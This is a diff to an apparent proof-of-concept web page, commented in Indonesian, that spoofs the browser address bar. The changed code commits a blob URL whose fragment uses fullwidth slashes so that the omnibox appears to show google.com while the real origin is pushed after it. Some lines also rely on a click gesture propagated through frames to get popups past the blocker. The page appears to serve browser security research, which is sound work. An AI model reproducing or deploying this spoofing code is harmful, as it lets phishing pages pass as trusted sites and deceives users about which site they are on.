@@ -225,8 +225,9 @@
 
       // Tombol gesture — user activation nyebar ke seluruh frame tree,
       // jadi window.open(blob:null) dari launcher lolos popup blocker.
+      // Klik JUGA langsung commit canonical blob + fragment display-spoof.
       var btn = document.createElement('button');
-      btn.textContent = '🔁 Redirect gagal? KLIK DI SINI (unlock popup via gesture)';
+      btn.textContent = '🔁 KLIK: buka tab popup + commit display-spoof URL';
       btn.style.cssText = 'margin-top:12px;padding:10px 18px;font-size:0.9rem;cursor:pointer;' +
                           'border-radius:8px;border:1px solid #333;background:#161616;color:#fff;';
       btn.onclick = function () {
@@ -234,14 +235,24 @@
         spawned.forEach(function (f) {
           try { f.contentWindow.postMessage('blobnull:open-popup', '*'); } catch (e) {}
         });
+        var u = makeBlobUrl();
+        log('[main] commit: ' + u + TARGET + '%EF%BC%8F' + u);
+        location.replace(u + TARGET + '%EF%BC%8F' + u);
       };
       document.body.appendChild(btn);
 
-      // Safety-net: kalau semua vektor gagal total, pembanding blob biasa.
+      // Safety-net: kalau semua vektor gagal total -> DISPLAY SPOOF.
+      // Chrome hanya commit canonical blob:<origin>/<uuid>, dan omnibox
+      // menampilkannya verbatim + fragment. Fragment boleh berisi apa saja,
+      // jadi real origin "diselundupkan" SETELAH google.com di fragment.
+      // Display akhir:
+      //   blob:https://abhirdd.github.io/<uuid>#%EF%BC%8Fgoogle.com%EF%BC%8F
+      //        https://abhirdd.github.io/<uuid>
       setTimeout(function () {
         if (iframeFallback) return; // biarkan iframe blob:null tampil
-        log('[main] SEMUA vektor gagal -> fallback blob:https (pembanding)');
-        location.replace(makeBlobUrl() + TARGET);
+        var u = makeBlobUrl();
+        log('[main] fallback -> commit canonical blob + fragment display-spoof');
+        location.replace(u + TARGET + '%EF%BC%8F' + u);
       }, 10000);
     })();
   </script>
